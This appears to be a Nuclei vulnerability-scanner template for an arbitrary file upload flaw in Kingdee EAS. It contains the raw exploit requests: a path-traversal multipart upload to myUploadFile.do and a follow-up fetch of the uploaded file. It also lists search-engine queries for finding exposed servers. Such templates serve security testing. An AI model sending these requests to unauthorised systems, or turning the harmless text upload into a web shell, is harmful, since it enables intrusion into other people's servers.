id: kingdee-eas-myUploadFile-fileupload
info:
  name: 金蝶EAS myUploadFile任意文件上传
  author: leadlife
  severity: critical
  description: 金蝶EAS myUploadFile任意文件上传
  reference: 
    - https://github.com/wy876/POC/blob/61b2bf45a165e027ea7014e0bd153f5bf1108b61/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6EAS%20myUploadFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-Kingdee-EAS-myUploadFile.do-upload.yml
  metadata:
    verified: false
    max-request: 1
    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
    hunter-query: web.body="/eassso/images/"
    quake-query: app:"金蝶-EAS"
    zoomeye-query: app:"金蝶 EAS"
  tags: kingdee,fileupload,oa,eas

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y/%M/%D")}}'

http:
  - raw:
      - |
        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Length: 205

        ------WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Disposition: form-data; name="myFile"; filename="{{filename}}.txt"
        Content-Type: text/html

        {{randstr}}
        ------WebKitFormBoundarySq4lDnabv8CwHfvx--
        
      - |+
        GET /easportal/buffalo/../{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and